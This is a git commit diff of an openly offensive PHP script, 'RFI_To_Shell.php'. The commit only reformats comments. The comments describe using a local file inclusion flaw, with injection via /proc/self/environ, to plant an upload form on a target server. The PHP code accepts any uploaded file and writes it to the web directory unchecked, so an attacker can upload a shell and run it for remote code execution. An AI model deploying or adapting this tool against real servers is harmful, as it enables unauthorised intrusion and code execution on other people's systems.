78b6839227c4f2050f0b90c761cf6afc1de5c2cc
Sarthak Gupta <789sk.gupta@gmail.com>
2019-06-13 22:52:39 +0530

    Update RFI_To_Shell.php

--- RFI_To_Shell.php
+++ RFI_To_Shell.php
@@ -3,12 +3,12 @@
    like burp-suite in ../proc/self/environ section of the site/server accessed with the vulnerable web application 
    
    
-   <!-- created by Me : 789sk.gupta@gmail.com -->
-<!-- This is a php script which provides a interface(GUI) to upload a shell/malicious file from attacker computer 
+   // created by Me : 789sk.gupta@gmail.com -->
+ // This is a php script which provides a interface(GUI) to upload a shell/malicious file from attacker computer 
      to the target server --!>
-<!-- after the file upload attacker can directly access/execute the malicious payload and perform RCE;))) --!> 
+ // after the file upload attacker can directly access/execute the malicious payload and perform RCE;))) --!> 
 
-<!-- Remote code execution payload by exploiting the LFI vulnerbility.--!>
+// Remote code execution payload by exploiting the LFI vulnerbility.--!>
 
 // There is also require to encode the payload sometimes before sending to the server .   
 
@@ -16,7 +16,7 @@
 <form enctype="multipart/form-data" action="#" method="GET">
 <input name="uploadedfile" type="file"/></input>
 <input type="submit" value="Uploadhere"/>
-</form>  <!-- form closed --!>
+</form>  
 <?php 
   $target_path=basename($_FILES["uploadedfile"]["name"]);
     if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path))
